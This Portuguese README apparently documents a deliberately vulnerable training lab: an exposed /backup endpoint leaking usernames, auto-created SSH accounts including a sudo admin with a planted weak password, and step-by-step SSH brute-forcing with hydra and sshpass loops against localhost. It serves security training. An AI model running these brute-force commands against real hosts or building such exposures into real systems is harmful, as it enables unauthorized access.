# Security Lab Setup - React2Shell Web Vulnerable

Um conjunto completo de scripts para configurar um ambiente de teste de segurança com:
- **Servidor Web**: Apache proxy para Next.js na porta 80
- **Vulnerabilidade Exposição de Dados**: `/backup` endpoint expõe usernames
- **Serviço SSH**: Contas criadas automaticamente baseadas em usernames expostos
- **Teste de Bruteforce**: Scripts para simular ataques SSH

## 📋 Pré-requisitos

- Sistema Linux (Ubuntu/Debian recomendado)
- Acesso root ou sudo
- Git (para clonar o repositório)

## 🚀 Instalação Rápida (Um Comando)

```bash
sudo bash scripts/setup-full-lab.sh
```

Isto irá automaticamente:
1. ✅ Instalar e configurar Apache2
2. ✅ Instalar Node.js e dependências do projeto
3. ✅ Build da aplicação Next.js
4. ✅ Instalar OpenSSH Server
5. ✅ Criar contas de usuário baseadas em usernames expostos
6. ✅ Extrair credenciais para teste de bruteforce

## 📝 Instalação Manual (Passo a Passo)

Se preferir executar manualmente:

### Passo 1: Setup do Webserver
```bash
sudo bash scripts/setup-webserver.sh
```

### Passo 2: Setup do SSH
```bash
sudo bash scripts/setup-ssh.sh
```

### Passo 3: Extrair Credenciais
```bash
bash scripts/extract-credentials.sh
```

### Passo 4: Aplicação já está rodando
O `setup-webserver.sh` sobe a aplicação automaticamente via `npm run dev`
como serviço systemd (`nextjs-lab`). Não é necessário rodar `npm start`.
```bash
sudo systemctl status nextjs-lab
```

## 🧪 Testes e Exploração

### Verificar Setup
```bash
bash scripts/test-lab.sh
```

### Etapa 1: Descobrir Vulnerabilidade (OSINT/FUZZING)

Acessar a aplicação e explorar `/backup`:
```bash
# Via navegador
curl http://localhost/backup

# Ver lista de usernames
curl http://localhost/backup/usernames.txt

# Ver lista de admins  
curl http://localhost/backup/admins.txt
```

Os arquivos expostos estão em:
```
public/backup/
├── usernames.txt    # Lista de usernames
├── accounts.txt     # Dados de contas
├── admins.txt       # Usernames de admin
└── users.txt        # Dados de usuários
```

### Etapa 2: Extrair Informações para Bruteforce

```bash
# Já feito automaticamente, mas pode regenerar:
bash scripts/extract-credentials.sh

# Visualizar usernames descobertos
cat fuzzing-output/combined-usernames.txt

# Visualizar wordlist de passwords
cat fuzzing-output/bruteforce-wordlist.txt
```

### Etapa 3: Executar Bruteforce SSH

#### Opção A: Script Automatizado
```bash
bash scripts/bruteforce-ssh.sh [host] [porta] [usernames-file] [passwords-file]

# Exemplo padrão:
bash scripts/bruteforce-ssh.sh localhost 22
```

#### Opção B: Usando Hydra
```bash
# Instalar se necessário
sudo apt-get install -y hydra

# Executar bruteforce
hydra -L fuzzing-output/combined-usernames.txt \
      -P fuzzing-output/bruteforce-wordlist.txt \
      ssh://localhost -t 4 -v
```

#### Opção C: Manual com sshpass
```bash
# Teste rápido com credencial padrão
sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@localhost

# Loop com múltiplas credenciais
while read user; do
  echo "[*] Testando $user..."
  sshpass -p 'password123' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no $user@localhost "id" && \
    echo "[+] SUCESSO: $user"
done < fuzzing-output/combined-usernames.txt
```

## 🔑 Credencial do Admin SSH

O `setup-ssh.sh` cria **um** usuário admin (o admin do repositório) com uma senha
que faz parte da wordlist **rockyou.txt** — ou seja, é quebrável por brute-force.

| Username   | Password   | Observação                                   |
|------------|------------|----------------------------------------------|
| `dpradmin` | `arsenal`  | Membro de `sudo`; senha presente no rockyou  |

> O **username** não é entregue de graça: ele fica exposto no arquivo
> `http://localhost/backup/system-accounts.txt`. A **senha** precisa ser
> descoberta por brute-force com o rockyou. Os demais arquivos em `/backup`
> (ex.: `portal-users.txt`) contêm apenas contas do portal web como iscas —
> elas **não** têm acesso SSH.

## 📊 Fluxo de Exploração Esperado

```
1. Descoberta
   └─ Acessar http://localhost
   └─ Encontrar endpoint /backup
   
2. OSINT/Fuzzing
   └─ Extrair usernames de /backup
   └─ Encontrar múltiplos arquivos .txt expostos
   
3. Preparação para Bruteforce
   └─ Compilar lista de usernames únicos
   └─ Preparar wordlist de passwords comuns
   
4. Bruteforce SSH
   └─ Testar credenciais contra SSH (porta 22)
   └─ Obter acesso com contas válidas
   
5. Pós-Exploração
   └─ Executar comandos como usuários comprometidos
   └─ Escalação de privilégios (exercício adicional)
```

## 📁 Estrutura de Arquivos Criados

```
Cong-thong-tin-dien-tu/
├── scripts/
│   ├── setup-webserver.sh          # Setup Apache (proxy Next.js)
│   ├── setup-ssh.sh                # Setup SSH + criar usuários
│   ├── setup-full-lab.sh           # Script automatizado completo
│   ├── extract-credentials.sh      # Extrair credenciais expostas
│   ├── test-lab.sh                 # Testar configuração
│   ├── bruteforce-ssh.sh           # Simular bruteforce SSH
│   ├── install-postgres-db-server.sh
│   ├── setup-lab-docker-postgres.sh
│   └── setup-lab-server-postgres.sh
├── docs/
│   ├── SETUP-LAB-README.md         # Este arquivo
│   ├── SCRIPTS-SUMMARY.md          # Resumo dos scripts
│   ├── DATABASE_SETUP.md           # Setup do banco de dados
│   └── REACT2SHELL_CONTEXT.md      # Contexto do cenário
├── fuzzing-output/
│   ├── combined-usernames.txt       # Usernames únicos extraídos
│   ├── bruteforce-wordlist.txt      # Wordlist de senhas
│   ├── ssh-bruteforce-guide.txt     # Guia de ferramentas
│   └── ssh-bruteforce-results.txt   # Resultados dos testes
└── README.md
```

## 🛠️ Troubleshooting

### Apache não está respondendo
```bash
# Verificar status
sudo systemctl status apache2

# Logs
sudo tail -f /var/log/apache2/error.log

# Reiniciar
sudo systemctl restart apache2
```

### Next.js não está rodando
```bash
# Verificar o serviço systemd
sudo systemctl status nextjs-lab
sudo journalctl -u nextjs-lab -f

# Reiniciar manualmente
sudo systemctl restart nextjs-lab
```

### SSH não está funcionando
```bash
# Verificar status
sudo systemctl status ssh

# Verificar usuários criados
cat /etc/passwd | grep -E "admin|canbo|congdan"

# Reiniciar SSH
sudo systemctl restart ssh

# Testar conexão
ssh -v admin@localhost
```

### Bruteforce não encontra credenciais
- Verificar se SSH está rodando: `sudo systemctl status ssh`
- Verificar se usuários foram criados: `id admin`
- Tentar manualmente: `sshpass -p 'password123' ssh admin@localhost`

## 📚 Arquivos Relacionados

- **public/backup/**: Arquivos expostos (vulnerabilidade simulada)
- **AGENTS.md**: Instruções para agentes de IA
- **package.json**: Dependências do Next.js

## ⚖️ Aviso Legal

Este lab é para fins **educacionais e autorizados apenas**. 

Use em:
- ✅ Seu próprio laboratório local
- ✅ Ambientes de teste controlados
- ✅ Treinamento de segurança autorizado
- ✅ Competições CTF
- ✅ Pesquisa de segurança com permissão

Não use para:
- ❌ Atacar sistemas não autorizados
- ❌ Teste de penetração sem permissão
- ❌ Atividades ilegais

## 📧 Suporte

Para problemas, verifique os logs:
```bash
cat setup-lab.log
```

## 🎯 Próximas Etapas de Aprendizado

Após completar a exploração:
1. **Escalação de Privilégios**: Tentar obter acesso root
2. **Análise de Código**: Investigar por que /backup está exposto
3. **Fix de Segurança**: Implementar proteção para /backup
4. **Hardening**: Melhorar configuração SSH (SSH keys, desabilitar root login, etc)

---
**Último Atualizado**: 2026-07-04
